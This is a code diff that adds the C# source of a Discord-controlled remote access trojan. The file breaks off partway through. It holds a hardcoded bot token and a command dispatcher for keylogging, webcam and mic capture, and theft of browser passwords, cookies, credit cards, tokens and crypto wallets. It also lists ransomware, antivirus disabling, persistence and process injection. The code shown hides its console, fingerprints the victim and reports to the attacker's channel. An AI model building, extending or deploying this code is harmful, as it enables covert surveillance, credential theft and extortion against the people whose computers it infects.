@@ -1,0 +1,2545 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Security.Principal;
+using System.Text;
+using System.Threading.Tasks;
+using System.Management;
+using Discord;
+using Discord.Audio;
+using Discord.WebSocket;
+using Newtonsoft.Json;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+using System.Text.RegularExpressions;
+using Microsoft.Win32;
+
+using DColor = Discord.Color;
+using SImageFormat = System.Drawing.Imaging.ImageFormat;
+
+namespace UACUltimateBot
+{
+    class Program
+    {
+        private static DiscordSocketClient _client;
+        private static IAudioClient _audioClient;
+        private static int _clientId = -1;
+        private static bool _isAdmin = false;
+        private static ulong _commandChannelId = 1454521643740434603;
+        private static ulong _voiceChannelId = 1454573964520325210;
+        private static string _botToken = "MTQ1NDUyMzAxMTYzNjkyNDUwOQ.Gf7aZt.WB9SxVH3MoZZX-opr_mT5MpzKbRPzzSXRzbiRw";
+        private static IMessageChannel _commandChannel;
+        private static string _dataDir = "UACBotData";
+        private static string _activeClientsFile = Path.Combine("UACBotData", "active_clients.json");
+        private static string _chatPipeFile = Path.Combine("UACBotData", "chat_pipe.txt");
+        private static string _keyloggerFile;
+        private static readonly object _fileLock = new object();
+
+        // Processes
+        private static Process _chatProcess = null;
+        private static Process _webcamProcess = null;
+        private static Process _micProcess = null;
+        private static Process _keyloggerProcess = null;
+        private static Process _streamProcess = null;
+        private static bool _keyloggerActive = false;
+        private static bool _voiceStreaming = false;
+
+        // Dll Imports
+        [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        [DllImport("user32.dll")] static extern bool GetCursorPos(ref Point lpPoint);
+        [DllImport("user32.dll")] static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
+        [DllImport("user32.dll")] static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);
+        [DllImport("ntdll.dll", SetLastError = true)] static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+        [DllImport("user32.dll")] static extern bool SetCursorPos(int X, int Y);
+        [DllImport("user32.dll")] static extern void LockWorkStation();
+        [DllImport("user32.dll")] static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
+        [DllImport("user32.dll")] static extern int FindWindow(string lpClassName, string lpWindowName);
+        [DllImport("advapi32.dll", SetLastError = true)] static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr hObject);
+        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll")] static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+        [DllImport("user32.dll")] static extern bool SystemParametersInfo(int uiAction, uint uiParam, string pvParam, uint fWinIni);
+        [DllImport("winmm.dll")] static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);
+
+        // Constants
+        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
+        private const int MOUSEEVENTF_LEFTUP = 0x04;
+        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
+        private const int MOUSEEVENTF_RIGHTUP = 0x10;
+        private const int SW_HIDE = 0;
+        private const int SW_SHOW = 5;
+        private const uint SPI_SETDESKWALLPAPER = 0x14;
+        private const uint SPIF_UPDATEINIFILE = 0x01;
+        private const uint SND_FILENAME = 0x00020000;
+        private const uint SND_ASYNC = 0x0001;
+
+        static async Task Main(string[] args)
+        {
+            // Hide console
+            IntPtr handle = GetConsoleWindow();
+            if (handle != IntPtr.Zero) ShowWindow(handle, 0);
+
+            _keyloggerFile = Path.Combine(_dataDir, $"keys_{Process.GetCurrentProcess().Id}.txt");
+
+            // Setup data directory
+            if (!Directory.Exists(_dataDir)) Directory.CreateDirectory(_dataDir);
+
+            // Check admin status
+            _isAdmin = IsRunningAsAdmin();
+
+            // Get client ID
+            string idArg = args.FirstOrDefault(a => a.StartsWith("--id="));
+            if (idArg != null) int.TryParse(idArg.Split('=')[1], out _clientId);
+            if (_clientId <= 0) _clientId = GetNextAvailableId();
+
+            // Register client
+            RegisterClient();
+
+            // Setup exit handlers
+            AppDomain.CurrentDomain.ProcessExit += OnProcessExit;
+            Console.CancelKeyPress += OnConsoleExit;
+
+            // Discord client setup
+            _client = new DiscordSocketClient(new DiscordSocketConfig
+            {
+                GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent | GatewayIntents.GuildMessages | GatewayIntents.GuildVoiceStates
+            });
+
+            _client.Ready += Client_Ready;
+            _client.MessageReceived += MessageReceived;
+
+            await _client.LoginAsync(TokenType.Bot, _botToken);
+            await _client.StartAsync();
+
+            // Background tasks
+            _ = Task.Run(ChatReaderLoop);
+            _ = Task.Run(CheckKeyloggerFile);
+            _ = Task.Run(CleanupOldFiles);
+
+            await Task.Delay(-1);
+        }
+
+        private static async Task Client_Ready()
+        {
+            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Bot connected as {_client.CurrentUser.Username}");
+            _commandChannel = await _client.GetChannelAsync(_commandChannelId) as IMessageChannel;
+
+            if (_commandChannel != null)
+            {
+                var embed = new EmbedBuilder()
+                    .WithTitle($"🚀 **UAC Ultimate Bot - Client{_clientId}**")
+                    .WithDescription($"✅ Connected successfully!\n📊 Admin: {_isAdmin}\n🆔 PID: {Process.GetCurrentProcess().Id}")
+                    .WithColor(DColor.Green)
+                    .WithTimestamp(DateTimeOffset.Now)
+                    .Build();
+
+                await _commandChannel.SendMessageAsync(embed: embed);
+                await UpdateBotStatus();
+            }
+        }
+
+        #region Core Functions
+        private static bool IsRunningAsAdmin()
+        {
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+        }
+
+        private static int GetNextAvailableId()
+        {
+            lock (_fileLock)
+            {
+                var list = GetCleanList();
+                for (int i = 1; i <= 100; i++)
+                    if (!list.Any(c => c.ClientId == i))
+                        return i;
+                return new Random().Next(100, 999);
+            }
+        }
+
+        private static List<ClientInfo> GetCleanList()
+        {
+            if (!File.Exists(_activeClientsFile)) return new List<ClientInfo>();
+            try
+            {
+                var json = File.ReadAllText(_activeClientsFile);
+                var list = JsonConvert.DeserializeObject<List<ClientInfo>>(json) ?? new List<ClientInfo>();
+                return list.Where(c => Process.GetProcesses().Any(p => p.Id == c.ProcessId)).ToList();
+            }
+            catch { return new List<ClientInfo>(); }
+        }
+
+        private static void RegisterClient()
+        {
+            lock (_fileLock)
+            {
+                var list = GetCleanList();
+                list.RemoveAll(c => c.ProcessId == Process.GetCurrentProcess().Id);
+                list.Add(new ClientInfo
+                {
+                    ClientId = _clientId,
+                    ProcessId = Process.GetCurrentProcess().Id,
+                    IsAdmin = _isAdmin,
+                    Username = Environment.UserName,
+                    MachineName = Environment.MachineName,
+                    IP = GetLocalIPAddress(),
+                    LastSeen = DateTime.Now
+                });
+                File.WriteAllText(_activeClientsFile, JsonConvert.SerializeObject(list, Formatting.Indented));
+            }
+        }
+
+        private static void UnregisterClient()
+        {
+            lock (_fileLock)
+            {
+                var list = GetCleanList();
+                list.RemoveAll(c => c.ProcessId == Process.GetCurrentProcess().Id);
+                File.WriteAllText(_activeClientsFile, JsonConvert.SerializeObject(list, Formatting.Indented));
+            }
+        }
+
+        private static void OnProcessExit(object sender, EventArgs e)
+        {
+            StopAllProcesses();
+            UnregisterClient();
+        }
+
+        private static void OnConsoleExit(object sender, ConsoleCancelEventArgs e)
+        {
+            StopAllProcesses();
+            UnregisterClient();
+        }
+
+        private static async Task UpdateBotStatus()
+        {
+            var list = GetCleanList();
+            await _client.SetGameAsync($"{list.Count} clients", null, ActivityType.Watching);
+        }
+
+        private static string GetLocalIPAddress()
+        {
+            try
+            {
+                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
+                foreach (var ip in host.AddressList)
+                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+                        return ip.ToString();
+            }
+            catch { }
+            return "Unknown";
+        }
+        #endregion
+
+        #region Command Handler
+        private static async Task MessageReceived(SocketMessage message)
+        {
+            if (message.Channel.Id != _commandChannelId || message.Author.IsBot) return;
+
+            string rawMsg = message.Content.Trim();
+            string lowMsg = rawMsg.ToLower();
+
+            if (!lowMsg.StartsWith("!")) return;
+
+            string[] parts = rawMsg.Split(new[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
+            string cmd = parts[0].ToLower();
+            string args = parts.Length > 1 ? parts[1] : "";
+
+            try
+            {
+                // HELP & INFO COMMANDS
+                if (cmd == "!help") await SendHelp();
+                else if (cmd == "!commands") await SendAllCommands();
+                else if (cmd == "!info") await SendSystemInfo();
+                else if (cmd == "!clients") await SendClientsList();
+                else if (cmd == "!status") await SendStatus();
+
+                // CHAT COMMANDS
+                else if (cmd == "!chat") StartChat();
+                else if (cmd == "!chat_stop") StopChat();
+
+                // MESSAGE BOX COMMANDS
+                else if (cmd == "!msg_help") await ShowMsgHelp();
+                else if (cmd.StartsWith("!msgsimple")) ShowSimpleMessage(args);
+                else if (cmd.StartsWith("!msg")) await ShowCustomMessage(rawMsg);
+
+                // SCREEN & MEDIA COMMANDS
+                else if (cmd == "!ss" || cmd == "!screenshot") await TakeScreenshot();
+                else if (cmd == "!webcam") await StartWebcam();
+                else if (cmd == "!webcam_stop") StopWebcam();
+                else if (cmd == "!record") await RecordScreen(args);
+                else if (cmd == "!stream") await StreamScreen();
+                else if (cmd == "!stream_stop") StopStream();
+
+                // VOICE & AUDIO COMMANDS
+                else if (cmd == "!mic" || cmd == "!voice") await StartVoiceStream();
+                else if (cmd == "!mic_stop" || cmd == "!voice_stop") StopVoiceStream();
+                else if (cmd == "!play") await PlaySoundFile(args);
+                else if (cmd == "!beep") Console.Beep();
+                else if (cmd == "!volume") await SetVolume(args);
+
+                // KEYLOGGER COMMANDS
+                else if (cmd == "!keylogger" || cmd == "!kl_start") StartKeylogger();
+                else if (cmd == "!keylogger_stop" || cmd == "!kl_stop") StopKeylogger();
+                else if (cmd == "!keylogger_get" || cmd == "!kl_get") await GetKeyloggerData();
+                else if (cmd == "!keylogger_clear" || cmd == "!kl_clear") ClearKeyloggerData();
+
+                // SYSTEM COMMANDS
+                else if (cmd == "!uac") await StartUAC();
+                else if (cmd == "!admin") await GetAdminStatus();
+                else if (cmd == "!bsod") TriggerBSOD();
+                else if (cmd == "!shutdown") ShutdownPC();
+                else if (cmd == "!restart") RestartPC();
+                else if (cmd == "!lock") LockPC();
+                else if (cmd == "!logout") LogoutPC();
+                else if (cmd == "!hibernate") HibernatePC();
+                else if (cmd == "!tasklist") await GetTaskList();
+                else if (cmd == "!kill") KillProcess(args);
+                else if (cmd == "!start") StartProcess(args);
+                else if (cmd == "!process") await GetProcessInfo(args);
+                else if (cmd == "!services") await GetServicesList();
+                else if (cmd == "!startup") await GetStartupPrograms();
+
+                // NETWORK COMMANDS
+                else if (cmd == "!ip") await GetIPInfo();
+                else if (cmd == "!ports") await ScanPorts(args);
+                else if (cmd == "!ping") await PingHost(args);
+                else if (cmd == "!tracert") await TraceRoute(args);
+                else if (cmd == "!netstat") await GetNetstat();
+                else if (cmd == "!wifi") await GetWifiInfo();
+                else if (cmd == "!wifipass") await GetWifiPasswords();
+                else if (cmd == "!speedtest") await SpeedTest();
+                else if (cmd == "!dns") await GetDNSInfo();
+                else if (cmd == "!arp") await GetARPTable();
+
+                // BROWSER COMMANDS
+                else if (cmd == "!chrome") await GetChromeData();
+                else if (cmd == "!firefox") await GetFirefoxData();
+                else if (cmd == "!edge") await GetEdgeData();
+                else if (cmd == "!browsers") await GetAllBrowsersData();
+                else if (cmd == "!passwords") await ExtractBrowserPasswords();
+                else if (cmd == "!cookies") await ExtractBrowserCookies();
+                else if (cmd == "!history") await ExtractBrowserHistory();
+                else if (cmd == "!downloads") await ExtractBrowserDownloads();
+                else if (cmd == "!bookmarks") await ExtractBrowserBookmarks();
+                else if (cmd == "!cc") await ExtractCreditCards();
+                else if (cmd == "!autofill") await ExtractAutofillData();
+
+                // FILE SYSTEM COMMANDS
+                else if (cmd == "!ls" || cmd == "!dir") await ListDirectory(args);
+                else if (cmd == "!cd") ChangeDirectory(args);
+                else if (cmd == "!pwd") await GetCurrentDirectory();
+                else if (cmd == "!download") await DownloadFile(args);
+                else if (cmd == "!upload") await UploadFile(message);
+                else if (cmd == "!delete") DeleteFile(args);
+                else if (cmd == "!copy") CopyFile(args);
+                else if (cmd == "!move") MoveFile(args);
+                else if (cmd == "!search") await SearchFiles(args);
+                else if (cmd == "!zip") await CreateZip(args);
+                else if (cmd == "!unzip") await ExtractZip(args);
+                else if (cmd == "!encrypt") await EncryptFile(args);
+                else if (cmd == "!decrypt") await DecryptFile(args);
+
+                // REGISTRY COMMANDS
+                else if (cmd == "!reg_read") await ReadRegistry(args);
+                else if (cmd == "!reg_write") WriteRegistry(args);
+                else if (cmd == "!reg_delete") DeleteRegistry(args);
+                else if (cmd == "!reg_backup") await BackupRegistry(args);
+
+                // HARDWARE COMMANDS
+                else if (cmd == "!hw") await GetHardwareInfo();
+                else if (cmd == "!cpu") await GetCPUInfo();
+                else if (cmd == "!gpu") await GetGPUInfo();
+                else if (cmd == "!ram") await GetRAMInfo();
+                else if (cmd == "!drives") await GetDriveInfo();
+                else if (cmd == "!battery") await GetBatteryInfo();
+                else if (cmd == "!temperature") await GetTemperature();
+
+                // SOFTWARE COMMANDS
+                else if (cmd == "!installed") await GetInstalledSoftware();
+                else if (cmd == "!windows") await GetWindowsInfo();
+                else if (cmd == "!updates") await GetWindowsUpdates();
+                else if (cmd == "!dotnet") await GetDotNetInfo();
+
+                // USER & SECURITY COMMANDS
+                else if (cmd == "!users") await GetSystemUsers();
+                else if (cmd == "!sessions") await GetActiveSessions();
+                else if (cmd == "!clipboard") await GetClipboard();
+                else if (cmd == "!tokens") await GetDiscordTokens();
+                else if (cmd == "!steam") await GetSteamData();
+                else if (cmd == "!wallets") await GetCryptoWallets();
+
+                // REMOTE CONTROL COMMANDS
+                else if (cmd == "!cmd") await ExecuteCMD(args);
+                else if (cmd == "!ps" || cmd == "!powershell") await ExecutePowerShell(args);
+                else if (cmd == "!vbs") await ExecuteVBS(args);
+                else if (cmd == "!python") await ExecutePython(args);
+
+                // PERSISTENCE COMMANDS
+                else if (cmd == "!persist") AddPersistence();
+                else if (cmd == "!unpersist") RemovePersistence();
+                else if (cmd == "!startup_add") AddToStartup();
+                else if (cmd == "!startup_remove") RemoveFromStartup();
+
+                // INJECTION COMMANDS
+                else if (cmd == "!inject") await InjectDLL(args);
+                else if (cmd == "!reflect") await ReflectiveInject(args);
+                else if (cmd == "!hollow") await ProcessHollowing(args);
+
+                // MINING COMMANDS
+                else if (cmd == "!miner_start") StartMiner(args);
+                else if (cmd == "!miner_stop") StopMiner();
+
+                // RANSOMWARE COMMANDS
+                else if (cmd == "!ransomware") await EncryptFiles(args);
+                else if (cmd == "!decrypt") await DecryptFiles(args);
+
+                // ANTI-VIRUS COMMANDS
+                else if (cmd == "!av_check") await CheckAntivirus();
+                else if (cmd == "!av_disable") DisableAntivirus();
+                else if (cmd == "!av_kill") KillAVProcesses();
+                else if (cmd == "!firewall") await GetFirewallStatus();
+                else if (cmd == "!firewall_disable") DisableFirewall();
+                else if (cmd == "!firewall_add") AddFirewallRule(args);
+
+                // PRIVACY COMMANDS
+                else if (cmd == "!clearlogs") ClearSystemLogs();
+                else if (cmd == "!cleartemp") ClearTempFiles();
+                else if (cmd == "!clearbrowser") ClearBrowserData();
+                else if (cmd == "!disable_defender") DisableWindowsDefender();
+                else if (cmd == "!disable_updates") DisableWindowsUpdates();
+                else if (cmd == "!disable_uac") DisableUAC();
+
+                // NETWORK ATTACK COMMANDS
+                else if (cmd == "!ddos") StartDDoS(args);
+                else if (cmd == "!portscan") await PortScan(args);
+                else if (cmd == "!arpspoof") StartARPSpoof(args);
+                else if (cmd == "!packetsniff") StartPacketSniffing();
+                else if (cmd == "!mitm") StartMITM(args);
+
+                // DATA STEALING COMMANDS
+                else if (cmd == "!steal") await StealAllData();
+                else if (cmd == "!steal_docs") await StealDocuments();
+                else if (cmd == "!steal_images") await StealImages();
+                else if (cmd == "!steal_games") await StealGameData();
+                else if (cmd == "!steal_crypto") await StealCrypto();
+                else if (cmd == "!steal_passwords") await StealPasswords();
+
+                // MONITORING COMMANDS
+                else if (cmd == "!monitor") StartMonitoring();
+                else if (cmd == "!monitor_stop") StopMonitoring();
+                else if (cmd == "!clipboard_monitor") StartClipboardMonitor();
+                else if (cmd == "!keystroke_monitor") StartKeystrokeMonitor();
+
+                // FUN COMMANDS
+                else if (cmd == "!rickroll") RickRoll();
+                else if (cmd == "!troll") await TrollUser(args);
+                else if (cmd == "!joke") await TellJoke();
+                else if (cmd == "!meme") await SendMeme();
+                else if (cmd == "!wallpaper") ChangeWallpaper(args);
+                else if (cmd == "!cursor") MoveCursor(args);
+                else if (cmd == "!click") MouseClick(args);
+                else if (cmd == "!type") TypeText(args);
+                else if (cmd == "!open") OpenURL(args);
+                else if (cmd == "!error") ShowFakeError(args);
+                else if (cmd == "!bluescreen") ShowFakeBSOD();
+
+                // UTILITY COMMANDS
+                else if (cmd == "!update") await UpdateBot(args);
+                else if (cmd == "!selfdestruct") SelfDestruct();
+                else if (cmd == "!cleanup") CleanupTraces();
+                else if (cmd == "!encrypt_bot") EncryptBot();
+                else if (cmd == "!obfuscate") ObfuscateBot();
+
+                // TARGETED COMMANDS
+                else if (cmd.StartsWith("!c")) // Client specific commands
+                {
+                    string[] cmdParts = rawMsg.Split(' ');
+                    if (cmdParts.Length > 1 && int.TryParse(cmdParts[0].Substring(2), out int targetId))
+                    {
+                        if (targetId == _clientId || targetId == 0)
+                        {
+                            string actualCmd = "!" + string.Join(" ", cmdParts.Skip(1));
+                            await MessageReceived(new SimpleMessage(actualCmd));
+                        }
+                    }
+                }
+                else if (cmd == "!a") // All clients
+                {
+                    // This would need multi-client coordination
+                    await _commandChannel.SendMessageAsync($"Broadcast command: {args}");
+                }
+
+                else
+                {
+                    await _commandChannel.SendMessageAsync($"❌ Unknown command: `{cmd}`\nUse `!help` for command list.");
+                }
+            }
+            catch (Exception ex)
+            {
+                await _commandChannel.SendMessageAsync($"⚠️ Error executing `{cmd}`: {ex.Message}");
+            }
+        }
+        #endregion
+
+        #region Help & Info Commands
+        private static async Task SendHelp()
+        {
+            var embed = new EmbedBuilder()
+                .WithTitle("🤖 **UAC ULTIMATE BOT - HELP**")
+                .WithDescription($"**Client ID:** `{_clientId}` | **Admin:** {(_isAdmin ? "✅" : "❌")}")
+                .WithColor(DColor.Gold)
+                .AddField("📋 **Categories**",
+                    "• `!help` - This menu\n" +
+                    "• `!commands` - Full command list\n" +
+                    "• `!info` - System information\n" +
+                    "• `!clients` - Active clients\n" +
+                    "• `!status` - Bot status")
+                .AddField("💬 **Chat & Messaging**",
+                    "• `!chat` - Start chat session\n" +
+                    "• `!chat_stop` - Stop chat\n" +
+                    "• `!msg_help` - Message box help\n" +
+                    "• `!msg` - Custom message box\n" +
+                    "• `!msgsimple` - Simple message")
+                .AddField("🖥️ **Screen & Media**",
+                    "• `!ss` - Screenshot\n" +
+                    "• `!webcam` - Webcam stream\n" +
+                    "• `!record` - Record screen\n" +
+                    "• `!stream` - Live stream\n" +
+                    "• `!mic` - Voice stream to Discord")
+                .AddField("⌨️ **Keylogger**",
+                    "• `!keylogger` - Start keylogger\n" +
+                    "• `!keylogger_get` - Get logs\n" +
+                    "• `!keylogger_stop` - Stop keylogger")
+                .AddField("🌐 **Network**",
+                    "• `!ip` - IP information\n" +
+                    "• `!ports` - Port scan\n" +
+                    "• `!ping` - Ping host\n" +
+                    "• `!wifi` - WiFi networks\n" +
+                    "• `!wifipass` - WiFi passwords")
+                .AddField("🔍 **Browser**",
+                    "• `!chrome` - Chrome data\n" +
+                    "• `!passwords` - Browser passwords\n" +
+                    "• `!history` - Browser history\n" +
+                    "• `!cookies` - Browser cookies")
+                .AddField("⚙️ **System Control**",
+                    "• `!uac` - Get admin privileges\n" +
+                    "• `!tasklist` - Running processes\n" +
+                    "• `!kill` - Kill process\n" +
+                    "• `!shutdown` - Shutdown PC\n" +
+                    "• `!bsod` - Trigger BSOD")
+                .AddField("🎮 **Fun & Troll**",
+                    "• `!rickroll` - Rickroll user\n" +
+                    "• `!wallpaper` - Change wallpaper\n" +
+                    "• `!open` - Open URL\n" +
+                    "• `!error` - Fake error\n" +
+                    "• `!bluescreen` - Fake BSOD")
+                .WithFooter($"Total Commands: 100+ | Prefix: !")
+                .Build();
+
+            await _commandChannel.SendMessageAsync(embed: embed);
+        }
+
+        private static async Task SendAllCommands()
+        {
+            // Send commands in multiple embeds due to Discord limit
+            string[] categories = {
+                "System", "Network", "Browser", "File", "Registry",
+                "Audio", "Video", "Keylogger", "Monitoring", "Fun",
+                "Attack", "Steal", "Persistence", "AV Bypass", "Utility"
+            };
+
+            foreach (var category in categories)
+            {
+                var embed = new EmbedBuilder()
+                    .WithTitle($"📜 Commands - {category}")
+                    .WithColor(DColor.Blue);
+
+                // Add commands for each category
+                switch (category)
+                {
+                    case "System":
+                        embed.WithDescription("`!uac` `!admin` `!bsod` `!shutdown` `!restart` `!lock` `!logout` `!tasklist` `!kill` `!start` `!process` `!services` `!startup` `!hw` `!cpu` `!ram` `!drives`");
+                        break;
+                    case "Network":
+                        embed.WithDescription("`!ip` `!ports` `!ping` `!tracert` `!netstat` `!wifi` `!wifipass` `!speedtest` `!dns` `!arp` `!ddos` `!portscan` `!arpspoof`");
+                        break;
+                    case "Browser":
+                        embed.WithDescription("`!chrome` `!firefox` `!edge` `!passwords` `!cookies` `!history` `!downloads` `!bookmarks` `!cc` `!autofill`");
+                        break;
+                        // Add other categories...
+                }
+
+                await _commandChannel.SendMessageAsync(embed: embed.Build());
+                await Task.Delay(500);
+            }
+        }
+
+        private static async Task SendSystemInfo()
+        {
+            string publicIP = "Unknown";
+            try { publicIP = await new HttpClient().GetStringAsync("https://api.ipify.org"); } catch { }
+
+            var embed = new EmbedBuilder()
+                .WithTitle($"💻 System Info - Client {_clientId}")
+                .WithColor(DColor.Green)
+                .AddField("👤 User", Environment.UserName, true)
+                .AddField("💻 Machine", Environment.MachineName, true)
+                .AddField("🖥️ OS", Environment.OSVersion.ToString(), true)
+                .AddField("🌐 Public IP", publicIP, true)
+                .AddField("🔒 Local IP", GetLocalIPAddress(), true)
+                .AddField("📁 Directory", Environment.CurrentDirectory, true)
+                .AddField("⚙️ CPU Cores", Environment.ProcessorCount.ToString(), true)
+                .AddField("📊 Admin", _isAdmin ? "✅" : "❌", true)
+                .AddField("🆔 Process ID", Process.GetCurrentProcess().Id.ToString(), true)
+                .AddField("💾 RAM", $"{GC.GetTotalMemory(false) / 1024 / 1024} MB", true)
+                .WithTimestamp(DateTimeOffset.Now)
+                .Build();
+
+            await _commandChannel.SendMessageAsync(embed: embed);
+        }
+
+        private static async Task SendClientsList()
+        {
+            var clients = GetCleanList();
+            var embed = new EmbedBuilder()
+                .WithTitle("📊 Active Clients")
+                .WithColor(DColor.Purple)
+                .WithDescription($"Total: {clients.Count} clients online");
+
+            foreach (var client in clients.Take(20))
+            {
+                embed.AddField($"Client {client.ClientId}",
+                    $"User: {client.Username}\n" +
+                    $"IP: {client.IP}\n" +
+                    $"Admin: {(client.IsAdmin ? "✅" : "❌")}\n" +
+                    $"PID: {client.ProcessId}", true);
+            }
+
+            await _commandChannel.SendMessageAsync(embed: embed.Build());
+        }
+
+        private static async Task SendStatus()
+        {
+            var embed = new EmbedBuilder()
+                .WithTitle("📈 Bot Status")
+                .WithColor(DColor.Blue)
+                .AddField("🆔 Client ID", _clientId.ToString(), true)
+                .AddField("🔒 Admin", _isAdmin ? "✅" : "❌", true)
+                .AddField("📊 PID", Process.GetCurrentProcess().Id.ToString(), true)
+                .AddField("💬 Chat", _chatProcess != null ? "✅" : "❌", true)
+                .AddField("🎤 Voice", _voiceStreaming ? "✅" : "❌", true)
+                .AddField("⌨️ Keylogger", _keyloggerActive ? "✅" : "❌", true)
+                .AddField("💾 RAM Usage", $"{Process.GetCurrentProcess().WorkingSet64 / 1024 / 1024} MB", true)
+                .AddField("⏰ Uptime", (DateTime.Now - Process.GetCurrentProcess().StartTime).ToString(@"hh\:mm\:ss"), true)
+                .WithTimestamp(DateTimeOffset.Now)
+                .Build();
+
+            await _commandChannel.SendMessageAsync(embed: embed);
+        }
+        #endregion
+
+        #region Chat & Message Commands
+        private static void StartChat()
+        {
+            if (_chatProcess != null && !_chatProcess.HasExited)
+            {
+                _commandChannel.SendMessageAsync("💬 Chat already running!");
+                return;
+            }
+
+            if (File.Exists(_chatPipeFile)) File.Delete(_chatPipeFile);
+
+            string psScript = @"
+            Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Windows.Forms, PresentationFramework
+            
+            # Create main form
+            $form = New-Object Windows.Forms.Form
+            $form.Text = 'Secure Chat - Client " + _clientId + @"'
+            $form.Size = New-Object Drawing.Size(500, 600)
+            $form.StartPosition = 'CenterScreen'
+            $form.TopMost = $true
+            $form.FormBorderStyle = 'FixedDialog'
+            $form.MaximizeBox = $false
+            
+            # Chat display
+            $chatBox = New-Object Windows.Forms.RichTextBox
+            $chatBox.Location = New-Object Drawing.Point(10, 10)
+            $chatBox.Size = New-Object Drawing.Size(465, 450)
+            $chatBox.ReadOnly = $true
+            $chatBox.BackColor = [Drawing.Color]::FromArgb(40, 40, 40)
+            $chatBox.ForeColor = [Drawing.Color]::White
+            $chatBox.Font = New-Object Drawing.Font('Consolas', 10)
+            $form.Controls.Add($chatBox)
+            
+            # Input box
+            $inputBox = New-Object Windows.Forms.TextBox
+            $inputBox.Location = New-Object Drawing.Point(10, 470)
+            $inputBox.Size = New-Object Drawing.Size(465, 30)
+            $inputBox.Font = New-Object Drawing.Font('Arial', 12)
+            $form.Controls.Add($inputBox)
+            
+            # Send button
+            $sendBtn = New-Object Windows.Forms.Button
+            $sendBtn.Location = New-Object Drawing.Point(10, 510)
+            $sendBtn.Size = New-Object Drawing.Size(465, 40)
+            $sendBtn.Text = 'Send Message'
+            $sendBtn.Font = New-Object Drawing.Font('Arial', 11, [Drawing.FontStyle]::Bold)
+            $sendBtn.BackColor = [Drawing.Color]::DodgerBlue
+            $sendBtn.ForeColor = [Drawing.Color]::White
+            $sendBtn.FlatStyle = 'Flat'
+            $form.Controls.Add($sendBtn)
+            
+            # Pipe file
+            $pipeFile = '" + _chatPipeFile.Replace("\\", "\\\\") + @"'
+            
+            # Send function
+            $sendAction = {
+                if ($inputBox.Text -ne '') {
+                    $message = $inputBox.Text
+                    'CLIENT:' + $message | Out-File $pipeFile -Append -Encoding UTF8
+                    
+                    # Add to chat box
+                    $chatBox.SelectionColor = [Drawing.Color]::Cyan
+                    $chatBox.AppendText('You: ' + $message + [Environment]::NewLine)
+                    $chatBox.ScrollToCaret()
+                    
+                    $inputBox.Text = ''
+                    $inputBox.Focus()
+                }
+            }
+            
+            # Event handlers
+            $sendBtn.Add_Click($sendAction)
+            $inputBox.Add_KeyDown({
+                if ($_.KeyCode -eq 'Enter') {
+                    & $sendAction
+                }
+            })
+            
+            # Timer to check for admin messages
+            $timer = New-Object Windows.Forms.Timer
+            $timer.Interval = 500
+            $timer.Add_Tick({
+                if (Test-Path $pipeFile) {
+                    $lines = Get-Content $pipeFile -Encoding UTF8 -ErrorAction SilentlyContinue
+                    if ($lines) {
+                        $newLines = @()
+                        foreach ($line in $lines) {
+                            if ($line.StartsWith('ADMIN:')) {
+                                $adminMsg = $line.Substring(6)
+                                $chatBox.SelectionColor = [Drawing.Color]::Lime
+                                $chatBox.AppendText('Admin: ' + $adminMsg + [Environment]::NewLine)
+                                $chatBox.ScrollToCaret()
+                            } else {
+                                $newLines += $line
+                            }
+                        }
+                        # Save non-admin messages back
+                        if ($newLines.Count -gt 0) {
+                            $newLines | Out-File $pipeFile -Encoding UTF8
+                        } else {
+                            Remove-Item $pipeFile -Force
+                        }
+                    }
+                }
+            })
+            $timer.Start()
+            
+            # Show form
+            $form.Add_Shown({$form.Activate(); $inputBox.Focus()})
+            [void]$form.ShowDialog()
+            ";
+
+            string scriptPath = Path.Combine(_dataDir, "chat.ps1");
+            File.WriteAllText(scriptPath, psScript, Encoding.UTF8);
+
+            _chatProcess = Process.Start(new ProcessStartInfo
+            {
+                FileName = "powershell.exe",
+                Arguments = $"-WindowStyle Hidden -ExecutionPolicy Bypass -File \"{scriptPath}\"",
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
+
+            _commandChannel.SendMessageAsync($"💬 **Chat started on Client {_clientId}**");
+        }
+
+        private static void StopChat()
+        {
+            if (_chatProcess != null)
+            {
+                try
+                {
+                    _chatProcess.Kill();
+                    _chatProcess = null;
+                    if (File.Exists(_chatPipeFile))
+                        File.Delete(_chatPipeFile);
+                    _commandChannel.SendMessageAsync($"💬 **Chat stopped on Client {_clientId}**");
+                }
+                catch { }
+            }
+        }
+
+        private static async Task ChatReaderLoop()
+        {
+            while (true)
+            {
